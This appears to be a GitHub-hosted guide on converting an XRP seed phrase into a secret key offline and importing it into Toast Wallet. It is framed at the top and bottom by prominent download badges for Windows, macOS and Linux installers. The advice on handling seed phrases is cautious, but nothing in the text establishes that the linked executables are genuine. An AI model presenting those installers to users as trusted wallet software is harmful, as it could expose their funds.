<p align="center"><img src="https://github.com/Toast-Wallet/learn/raw/HEAD/assets/banner-article.png" alt="Toast Wallet banner" width="100%"></p>

<h1 align="center">Toast Wallet seed phrase to secret key offline</h1>

<p align="center">Turn 12 or 24 words into an XRP secret key with the internet off.</p>

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

All versions and checksums are on the [Toast Wallet 3.0.0 release page](https://github.com/Toast-Wallet/core/releases/tag/3.0.0).

> [!IMPORTANT]
> Only download from this GitHub release page.

---

## 💡 Short answer

Toast Wallet does not accept 12 or 24 word seed phrases directly. Turn the phrase into an XRP secret key (starting with `s`) using a downloaded, open-source derivation tool with the internet switched off, then import that key in the [latest Toast Wallet](https://github.com/Toast-Wallet/core/releases/tag/3.0.0) with **+ → Import an existing account**.

## 👀 You'll see this if

- You have a 12 or 24 word phrase that controls XRP.
- You want that account inside Toast Wallet.
- Toast Wallet asks for a secret key, and you only have words.
- Websites offer to convert your phrase online.

## 🤔 Why it matters

A 12 or 24 word phrase follows a standard used by many wallets. From it, a specific account key is derived. Toast Wallet works with XRP secret keys directly, so the phrase has to be turned into the key first. That conversion is mathematical, and it can be done on your own computer.

It must be done offline. A seed phrase is the most valuable thing you own in crypto. Typing it into a website, even one that looks reputable, means trusting that site and every script it loads. Scam pages built for exactly this purpose appear constantly. The safe method uses a downloaded tool that runs locally in your browser with the network disconnected.

## 🧭 Before you start

Use a computer you trust. Download the open-source standalone tool file in advance; a widely used option is the Ian Coleman BIP39 standalone page, published on GitHub as `bip39-standalone.html`. Save it to your computer. Have your phrase on paper and a second sheet ready for the secret key.

## 🛠️ Fix: convert offline, then import

1. **Turn off the internet.** Unplug the network cable and switch off Wi-Fi. Confirm a normal web page no longer loads.
2. **Open the saved tool file** in your browser by double-clicking it.
3. **Enter your phrase.** Type the words in order. Select XRP as the coin.
4. **Find the account.** The tool lists derived accounts with their address and secret key. Find the address you expect, which starts with `r`.
5. **Write down the secret key.** Copy the key starting with `s` onto paper. Check it twice.
6. **Close the browser completely.** Then restart the computer before reconnecting to the internet.
7. **Import into Toast Wallet.** Open Toast Wallet and choose **+ → Import an existing account**. Type the secret key and check the address matches. The full routine is in [import an XRP secret key into Toast Wallet](https://github.com/Toast-Wallet/learn/blob/main/how-to/import-xrp-secret-key-into-toast-wallet.md).
8. **Back up.** Make a new Toast backup code so the account is included.

## 🧩 Real-world example

A user created an XRP account years ago in a hardware-style app that gave them 24 words. They want it in Toast Wallet on their desktop. Instead of searching "convert seed to XRP key online", they save the standalone tool file, unplug their router, type the words, find the address they recognise and copy its secret key onto paper. After restarting and reconnecting, they import the key into Toast Wallet, see the same address and balance, and make a new backup.

## ⚠️ Common mistakes

- Running the conversion on a live website instead of an offline file.
- Picking the wrong derived account, which has a different address and no balance.
- Leaving the browser open with the phrase still on screen after reconnecting.
- Confusing Toast's six recovery words with a 12 or 24 word seed; see [Toast Wallet six words are not a seed](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-six-words-not-a-seed.md).

## 🔁 If that did not work

- **The address does not match.** Check word spelling and order, and look further down the list of derived accounts.
- **The tool shows an error.** Check that each word is from the standard word list and that the count is correct.
- **You are unsure about key formats.** Read [Toast Wallet private key and family seed](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-private-key-family-seed.md).
- **A site offers to do it for you.** Leave it; see [Toast Wallet phishing sites warning](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-phishing-sites-warning.md).

## 🛡️ Prevention

Never photograph or type your phrase anywhere online. Keep the tool file locally for future use. After importing, treat the Toast backup code as your main backup and store the phrase securely or retire it carefully.

## 🔍 A closer look at why offline matters

When the internet is off, nothing typed into the tool can leave your computer, even if a script inside the page tried to send it somewhere. That is the whole point of using a standalone file. Downloading the file in advance, checking that it comes from its official GitHub release, and then disconnecting before you open it gives you a strong layer of protection.

Restarting the computer before reconnecting adds a further layer. It clears the browser's memory and any temporary data left behind by the page. If you want to be extra careful, use a separate computer that you keep offline for this task. Either way, never perform this conversion on a phone, a shared computer or a machine you do not fully trust.

## 🧠 Remember

Offline tool, correct address, paper copy, restart, import, backup. Those six steps, in that order, turn a word list into a Toast Wallet account without exposing your phrase to the internet. If any step feels rushed or unclear, pause and come back to it later rather than shortcutting it with an online converter.

## ❓ FAQ

<details>
<summary>Is the offline tool hosted on this site?</summary>

No. You download the standalone file and run it on your own computer, offline.

</details>

<details>
<summary>Can Toast Wallet read my 24 words directly?</summary>

No. Convert them to an XRP secret key first.

</details>

<details>
<summary>Do I need to stay offline after importing?</summary>

No. Import with Toast Wallet normally once the tool is closed and the computer restarted.

</details>

> [!WARNING]
> Never type a seed phrase into a website. Real conversion happens offline on your own computer.

---

## ⬇️ Download Toast Wallet 3.0.0

<p align="center">
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-WINDOWS-1f5fbf?style=for-the-badge&logo=windows&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Windows"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-MACOS-1f5fbf?style=for-the-badge&logo=apple&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Macos"></a>
  <a href="https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage"><img src="https://img.shields.io/badge/%E2%AC%87%20DOWNLOAD-LINUX-1f5fbf?style=for-the-badge&logo=linux&logoColor=white&labelColor=142033" alt="Download Toast Wallet for Linux"></a>
</p>

| Platform | File |
|:--|:--|
| 🪟 Windows | [`ToastWallet.Setup.3.0.0.exe`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet.Setup.3.0.0.exe) |
| 🍎 macOS | [`ToastWallet-3.0.0.dmg`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0.dmg) |
| 🐧 Linux | [`ToastWallet-3.0.0-x86_64.AppImage`](https://github.com/Toast-Wallet/core/releases/download/3.0.0/ToastWallet-3.0.0-x86_64.AppImage) |

Checksums for every file are on the [official Toast Wallet 3.0.0 release](https://github.com/Toast-Wallet/core/releases/tag/3.0.0). More guides live in the [Toast Wallet learn hub](https://github.com/Toast-Wallet/learn).

---

## 📚 Related articles

| Guide | What it covers |
|:--|:--|
| [Import an XRP secret key into Toast Wallet](https://github.com/Toast-Wallet/learn/blob/main/how-to/import-xrp-secret-key-into-toast-wallet.md) | Add an existing account with its secret key starting with s. |
| [Toast Wallet private key and family seed](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-private-key-family-seed.md) | The difference between secret key, family seed and private key. |
| [Toast Wallet phishing sites warning](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-phishing-sites-warning.md) | Spot look-alike addresses that ask for your words. |
| [Toast Wallet six words are not a seed](https://github.com/Toast-Wallet/learn/blob/main/how-to/toast-wallet-six-words-not-a-seed.md) | Why the six words alone cannot rebuild a wallet. |
